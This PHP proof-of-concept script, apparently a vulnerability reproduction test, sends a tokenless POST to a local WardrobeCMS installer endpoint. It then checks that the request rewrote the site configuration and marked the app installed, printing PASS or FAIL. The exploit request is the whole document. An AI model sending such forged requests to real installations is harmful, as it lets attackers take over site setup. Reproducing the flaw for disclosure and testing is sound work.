<?php
/*
 PoC for WardrobeCMS installer CSRF.
 Run manually:
   docker build -t poc-0783 .
   docker run --rm poc-0783
 Expected: POST /install/config succeeds with no _token and changes state.
*/
function http_request($method, $url, $headers = [], $body = '') {
    $headerString = implode("\r\n", $headers);
    $opts = ['http' => [
        'method' => $method,
        'header' => $headerString,
        'content' => $body,
        'ignore_errors' => true,
    ]];
    $response = file_get_contents($url, false, stream_context_create($opts));
    return [$response, $http_response_header ?? []];
}

$state = __DIR__ . '/state/wardrobe.php';
@mkdir(dirname($state), 0777, true);
file_put_contents($state, "<?php\nreturn array('title'=>'Initial Site','theme'=>'Default','per_page'=>5,'installed'=>false);\n");

$payload = http_build_query([
    'title' => 'CSRF Owned Wardrobe',
    'theme' => 'Default',
    'per_page' => '42',
    // Intentionally no _token.
]);
[$response, $headers] = http_request('POST', 'http://127.0.0.1:8000/install/config', [
    'Content-Type: application/x-www-form-urlencoded',
    'Content-Length: ' . strlen($payload),
], $payload);

$config = file_get_contents($state);
$passed = strpos($config, 'CSRF Owned Wardrobe') !== false
    && strpos($config, "'installed'=>true") !== false
    && strpos($response, '"received__token":false') !== false;

echo "HTTP response: $response\n";
echo "Resulting config:\n$config\n";
if (!$passed) {
    fwrite(STDERR, "[FAIL] State was not changed by a tokenless POST.\n");
    exit(1);
}
echo "[PASS] Tokenless cross-site style POST changed installer configuration and marked the app installed.\n";
